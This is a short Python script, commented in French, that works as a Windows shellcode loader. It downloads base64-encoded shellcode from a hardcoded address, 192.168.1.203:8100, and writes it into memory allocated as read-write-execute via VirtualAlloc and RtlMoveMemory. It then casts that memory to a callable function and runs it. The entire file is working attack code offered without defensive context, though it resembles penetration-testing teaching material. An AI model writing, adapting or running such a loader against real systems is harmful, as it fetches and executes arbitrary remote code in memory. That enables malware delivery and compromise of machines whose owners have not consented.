from urllib import request
import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    # 1. Récupère le shellcode encodé en base64 depuis un serveur web
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    # 2. Écrit le shellcode en mémoire exécutable
    length = len(buf)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    # 3. Définition des types des arguments de RtlMoveMemory
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,  # destination
        ctypes.c_void_p,  # source
        ctypes.c_size_t   # taille
    )

    # 4. Allocation mémoire avec droits RWX (read/write/execute)
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    # 5. Crée un buffer ctypes contenant le shellcode
    buffer = ctypes.create_string_buffer(shellcode)

    # Écrit le buffer en mémoire exécutable
    ptr = write_memory(buffer)

    # 6. Cast du buffer en fonction callable
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))

    # 7. Exécution du shellcode
    shell_func()

if __name__ == '__main__':
    url = "http://192.168.1.203:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
